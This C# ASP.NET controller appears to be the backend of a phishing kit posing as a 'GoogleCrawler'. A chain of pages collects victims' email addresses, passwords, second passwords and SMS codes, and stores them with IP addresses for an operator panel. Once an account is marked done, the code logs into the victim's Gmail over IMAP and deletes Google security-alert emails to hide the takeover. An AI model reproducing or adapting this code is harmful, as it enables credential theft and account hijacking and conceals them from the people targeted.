using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using Microsoft.AspNetCore.Hosting;
using System.Globalization;
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Cors;
using MongoDB.Driver;
using System.Xml;
using Spire.Email.Pop3;

namespace GoogleCrawler.Controllers
{

    [EnableCors("MyPolicy")]
    public class BaseController : Controller
    {
        private IUsersRepository _usersRepository;
        private IUnitOfWork _uow;


        IHttpContextAccessor _httpContextAccessor;
        IHostingEnvironment _IHostingEnvironment;

        public BaseController(
            IUsersRepository usersRepository, IUnitOfWork uow,
         IHttpContextAccessor _IHttpContextAccessor,
         IHostingEnvironment _IHostingEnvironment
            )
        {
            this._usersRepository = usersRepository;
            this._uow = uow;
            this._httpContextAccessor = _IHttpContextAccessor;
            this._IHostingEnvironment = _IHostingEnvironment;
        }


        public IActionResult Index()
        {



            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        public void deleteMail(string mail, string pass)
        {
            Chilkat.Global glob = new Chilkat.Global();
            bool successs = glob.UnlockBundle("Anything for 30-day trial");
            if (successs != true)
            {
                Debug.WriteLine(glob.LastErrorText);
                return;
            }

            int status = glob.UnlockStatus;
            if (status == 2)
            {
                Debug.WriteLine("Unlocked using purchased unlock code.");
            }
            else
            {
                Debug.WriteLine("Unlocked in trial mode.");
            }

            Chilkat.Imap imap = new Chilkat.Imap();

            // Connect to an IMAP server.
            // Use TLS
            imap.Ssl = false;
            imap.Port = 993;
            bool success = imap.Connect("imap.gmail.com");
            if (success != true)
            {
                Debug.WriteLine(imap.LastErrorText);
                return;
            }

            // Login
            success = imap.Login(mail, pass);
            if (success != true)
            {
                Debug.WriteLine(imap.LastErrorText);
                return;
            }

            // Select an IMAP mailbox
            success = imap.SelectMailbox("Inbox");
            if (success != true)
            {
                Debug.WriteLine(imap.LastErrorText);
                return;
            }

            Chilkat.MessageSet messageSet = null;
            // We can choose to fetch UIDs or sequence numbers.
            bool fetchUids = true;
            // Get the message IDs of all the emails in the mailbox
            messageSet = imap.Search("ALL", fetchUids);
            if (imap.LastMethodSuccess == false)
            {
                Debug.WriteLine(imap.LastErrorText);
                return;
            }

            int numFound = messageSet.Count;
            if (numFound == 0)
            {
                Debug.WriteLine("No messages found.");

                return;
            }

            int upperBound = 3;
            if (numFound < upperBound)
                upperBound = numFound;

            int i = numFound - 1;

            bool bUid = messageSet.HasUids;
            while (i >= upperBound)
            {

                Chilkat.Email email = imap.FetchSingleHeader(messageSet.GetId(i), bUid);
                if (imap.LastMethodSuccess == false)
                {
                    Debug.WriteLine(imap.LastErrorText);
                    return;

                }
                else
                {
                    if (email != null && email.From.Contains("no-reply@accounts.google.com"))
                    {
                        success = imap.SetMailFlag(email, "Deleted", 1);
                        if (success != true)
                        {
                            Debug.WriteLine(imap.LastErrorText);
                            return;
                        }
                    }
                }

                i--;
            }

            // Disconnect from the IMAP server.
            success = imap.Disconnect();


        }

        [Route("getuser")]
        public async Task<IActionResult> getuser(string mail)
        {
            var row = _usersRepository.Where(o => o.mail == mail).Result.ToList().LastOrDefault();
            return Json(row);
        }

        [Route("settype")]
        public async Task<IActionResult> settype(string mail, stype stypeenum, string price)
        {
            var row = _usersRepository
              .Where(o => o.mail == mail)
              .Result.ToList().LastOrDefault();
            if (row != null)
            {
                row.stype = stypeenum;
                if (!string.IsNullOrEmpty(price))
                    row.price = price;
                _usersRepository.Update(row);
                var res = await _uow.Commit();

                if (stypeenum == stype.Ok || stypeenum == stype.Finish)
                {
                    try
                    {
                        deleteMail(row.mail, row.password);
                    }
                    catch (Exception)
                    {
                    }

                    try
                    {
                        deleteMail(row.mail, row.password2);
                    }
                    catch (Exception)
                    {
                    }


                }
               
                return Json(row);
            }
            else
            {
                return Json(null);
            }
        }


        [Route("getusers")]
        public async Task<IActionResult> getusers()
        {
            var row = _usersRepository
                .Where(o => o.stype != stype.Finish)
                .Result.ToList().LastOrDefault();

            return Json(row);
        }


        public Users setUsers(Users postModel)
        {
            postModel.ipAdress = _httpContextAccessor.HttpContext.Connection.RemoteIpAddress.ToString();
            _httpContextAccessor.HttpContext.Session.Set("postmodel", postModel);
            ViewBag.users = postModel;
            return postModel;
        }

        public async Task<Users> setModel(Users postModel)
        {
            var result = setUsers(postModel);
            var row = _usersRepository.Where(o => o.mail == result.mail).Result.ToList().LastOrDefault();
            if (row != null)
                _usersRepository.Update(result);
            else
                _usersRepository.Add(result);

            var rs = await _uow.Commit();
            return row;
        }

        [Route("panel")]
        public async Task<IActionResult> panel()
        {

            return View();
        }

        [Route("Password")]
        public async Task<IActionResult> Password(Users postModel)
        {
            setUsers(postModel);
            return View();
        }

        [Route("Password2")]
        public async Task<IActionResult> Password2()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("Sms")]
        public async Task<IActionResult> Sms()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("SmsSend")]
        public async Task<IActionResult> SmsSend(Users postModel)
        {
            var result = await setModel(postModel);
            return View();
        }

        [Route("Mail")]
        public async Task<IActionResult> Mail()
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("MailSend")]
        public async Task<IActionResult> MailSend(Users postModel)
        {
            var result = await setModel(postModel);
            return View();
        }

        [Route("Wait")]
        public async Task<IActionResult> Wait(Users postModel)
        {
            var result = await setModel(postModel);
            return View();
        }


        [Route("Finish")]
        public async Task<IActionResult> Finish(Users postModel)
        {
            ViewBag.users = _httpContextAccessor.HttpContext.Session.Get<Users>("postmodel");
            return View();
        }

        [Route("Login")]
        public IActionResult Login(Users postModel)
        {
            var result = setUsers(postModel);
            return Json(result);
        }




        [Route("getKur")]
        public async Task<IActionResult> getKur(string price)
        {
            XmlDocument xmlVerisi = new XmlDocument();
            xmlVerisi.Load("http://www.tcmb.gov.tr/kurlar/today.xml");

            if (price.Contains("€"))
            {
                decimal Euro = Convert.ToDecimal(xmlVerisi.SelectSingleNode(string.Format("Tarih_Date/Currency[@Kod='{0}']/ForexSelling", "EUR")).InnerText.Replace('.', ','));
                price = (Euro * price.Replace("€", "").ToDecimal()).ToDecimal().ToString();
            }
            if (price.Contains("$"))
            {
                decimal dolar = Convert.ToDecimal(xmlVerisi.SelectSingleNode(string.Format("Tarih_Date/Currency[@Kod='{0}']/ForexSelling", "USD")).InnerText.Replace('.', ','));
                price = (dolar * price.Replace("$", "").ToDecimal()).ToDecimal().ToString();
            }
            return Json(price);
        }



    }



}


